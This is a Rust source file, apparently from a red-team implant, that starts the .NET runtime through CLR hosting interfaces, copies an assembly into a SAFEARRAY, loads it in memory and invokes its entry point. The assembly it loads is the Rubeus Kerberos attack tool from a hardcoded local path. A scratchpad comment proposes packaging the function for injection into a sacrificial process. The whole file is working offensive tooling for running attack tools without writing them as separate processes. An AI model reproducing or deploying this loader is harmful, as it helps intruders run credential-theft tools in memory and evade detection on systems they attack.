use std::{ffi::c_void, ptr::null_mut};

use windows_sys::{
    Win32::System::{
        ClrHosting::{CLRCreateInstance, CorRuntimeHost},
        Com::SAFEARRAYBOUND,
        Ole::{SafeArrayAccessData, SafeArrayCreate, SafeArrayUnaccessData},
        Variant::{VARIANT, VT_I1},
    },
    core::GUID,
};

use crate::execute::ffi::{
    _AssemblyVtbl, AppDomain, ICLRMetaHost, ICLRRuntimeInfo, ICorRuntimeHost, IUnknown,
};

pub enum DotnetError {
    BoundOverflow,
    ClrNotInitialised(i32),
    RuntimeNotInitialised(i32),
    CorHostNotInitialised(i32),
    CannotStartRuntime(i32),
}

const GUID_META_HOST: GUID = GUID {
    data1: 0x9280188d,
    data2: 0xe8e,
    data3: 0x4867,
    data4: [0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde],
};

const GUID_RIID: GUID = GUID {
    data1: 0xD332DB9E,
    data2: 0xB9B3,
    data3: 0x4125,
    data4: [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16],
};

const GUID_RNTIME_INFO: GUID = GUID {
    data1: 0xBD39D1D2,
    data2: 0xBA2F,
    data3: 0x486a,
    data4: [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91],
};

const GUID_COR_RUNTIME: GUID = GUID {
    data1: 0xcb2f6723,
    data2: 0xab3a,
    data3: 0x11d2,
    data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
};

const GUID_APP_DOMAIN: GUID = GUID {
    data1: 0x05F696DC,
    data2: 0x2B29,
    data3: 0x3663,
    data4: [0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13],
};

pub fn execute_dotnet() -> Result<(), DotnetError> {
    //
    // SCRATCHPAD
    //

    // NOTE: This fn could be turned into a sub-DLL or something we can inject into a sacrificial process if
    // we want it loaded in a foreign process?

    // https://stackoverflow.com/questions/35670546/invoking-dotnet-assembly-method-from-c-returns-error-cor-e-safearraytypemismat
    // https://stackoverflow.com/questions/335085/hosting-clr-bad-parameters

    // For local dev, from a stack overflow post:
    // 1) Load  dotnet file into a string
    // 2) Copy file data into a SAFEARRAY
    // 3) Load managed assembly
    // 4) Get entrypoint of the assembly
    // 5) Get params of entrypoint and save in SAFEARRAY
    // 6) Call entrypoint, passing in params

    //
    // CODE SECTION
    //

    println!("Starting CLR stuff");
    let meta = create_clr_instance()?;
    println!("meta: {meta:p}");
    let runtime = get_runtime_v4(meta)?;
    println!("RT: {runtime:p}");
    let host = get_cor_runtime_host(runtime)?;
    println!("host: {host:p}");
    start_runtime(host)?;
    println!("RT started");

    // Read file
    let f = std::fs::read(r"C:\Users\flux\git\Rubeus\Rubeus\bin\Release\Rubeus.exe")
        .expect("could not read file");

    // Copy file into a SAFEARRAY
    let bounds = create_safe_array_bounds(f.len())?;
    let p_sa = unsafe { SafeArrayCreate(VT_I1, 1, &bounds) };

    // TODO ?
    // println!("Create domain");
    println!("Calling GetDefaultDomain");
    let app_domain = get_default_appdomain(host)?;
    println!("Called GetDefaultDomain");

    let mut p_data = null_mut();
    let todo = unsafe { SafeArrayAccessData(p_sa, &mut p_data) };
    unsafe { std::ptr::copy_nonoverlapping(f.as_ptr(), p_data as *mut u8, f.len()) };
    let todo = unsafe { SafeArrayUnaccessData(p_sa) };

    println!("Loading managed assembly");
    let mut sp_assembly: *mut _AssemblyVtbl = null_mut();
    unsafe {
        ((*(*app_domain).vtable).Load_3)(
            app_domain as *mut _,
            p_sa,
            &mut sp_assembly as *mut *mut _,
        )
    };

    // Get the entrypoint of the assembly, which should be the "Main" function
    println!("Get entrypoint");
    let mut entryp = null_mut();
    let h_result = unsafe { ((*sp_assembly).get_EntryPoint)(sp_assembly as *mut _, &mut entryp) };

    println!("hres entryp: {h_result:#X}");
    let mut retval = VARIANT::default();
    let object = VARIANT::default();

    let vt = unsafe { &(*(*entryp).vtable) };
    unsafe { (vt.Invoke_3)(entryp as *mut _, object, null_mut(), &mut retval) };

    println!("Ret val: {:?}", unsafe {
        retval.Anonymous.Anonymous.Anonymous.intVal
    });

    Ok(())
}

fn create_clr_instance() -> Result<*mut ICLRMetaHost, DotnetError> {
    let mut pp_interface = null_mut();

    let h_result = unsafe { CLRCreateInstance(&GUID_META_HOST, &GUID_RIID, &mut pp_interface) };

    if h_result != 0 {
        return Err(DotnetError::ClrNotInitialised(h_result));
    }

    Ok(pp_interface as *mut ICLRMetaHost)
}

fn create_safe_array_bounds(len: usize) -> Result<SAFEARRAYBOUND, DotnetError> {
    // Check we aren't going to overflow the buffer
    if len > u32::MAX as usize {
        return Err(DotnetError::BoundOverflow);
    }

    let mut bounds = SAFEARRAYBOUND::default();
    bounds.cElements = len as u32;

    Ok(bounds)
}

fn get_runtime_v4(meta: *mut ICLRMetaHost) -> Result<*mut ICLRRuntimeInfo, DotnetError> {
    let vtbl = (unsafe { &*meta }).lpVtbl;
    let get_runtime = (unsafe { &*vtbl }).GetRuntime;

    let mut p_runtime: *mut c_void = null_mut();
    let ver: Vec<u16> = "v4.0.30319\0".encode_utf16().collect();

    let h_result = unsafe { get_runtime(meta, ver.as_ptr(), &GUID_RNTIME_INFO, &mut p_runtime) };
    if h_result < 0 {
        return Err(DotnetError::RuntimeNotInitialised(h_result));
    }
    Ok(p_runtime as *mut ICLRRuntimeInfo)
}

fn get_cor_runtime_host(
    runtime: *mut ICLRRuntimeInfo,
) -> Result<*mut ICorRuntimeHost, DotnetError> {
    // let vtbl = (unsafe { &*(runtime) }).lpVtbl;

    let get_interface = unsafe { &*(*runtime).vtable }.GetInterface;

    let mut p_host: *mut c_void = std::ptr::null_mut();
    let h_result =
        unsafe { get_interface(runtime, &CorRuntimeHost, &GUID_COR_RUNTIME, &mut p_host) };
    if h_result < 0 {
        return Err(DotnetError::CorHostNotInitialised(h_result));
    }
    Ok(p_host as *mut ICorRuntimeHost)
}

fn start_runtime(host: *mut ICorRuntimeHost) -> Result<(), DotnetError> {
    let v_table = unsafe { &*(*host).vtable };

    let h_result = unsafe { (v_table.Start)(host) };
    if h_result < 0 {
        Err(DotnetError::CannotStartRuntime(h_result))
    } else {
        Ok(())
    }
}

fn get_default_appdomain(host: *mut ICorRuntimeHost) -> Result<*mut AppDomain, DotnetError> {
    let host_vtbl = unsafe { &*(*host).vtable };

    // GetDefaultDomain returns IUnknown**
    let mut unk = null_mut();
    let hr = unsafe { (host_vtbl.GetDefaultDomain)(host, &mut unk as *mut *mut _) };
    if hr < 0 {
        return Err(DotnetError::CorHostNotInitialised(hr));
    }

    // QI for _AppDomain
    let unk = unk as *mut IUnknown;
    let query_interface = unsafe { (*(*unk).lpVtbl).QueryInterface };
    let mut appdomain_ptr: *mut c_void = null_mut();

    let hr = unsafe { query_interface(unk, &GUID_APP_DOMAIN, &mut appdomain_ptr) };
    if hr < 0 {
        return Err(DotnetError::CorHostNotInitialised(hr));
    }

    Ok(appdomain_ptr as *mut AppDomain)
}
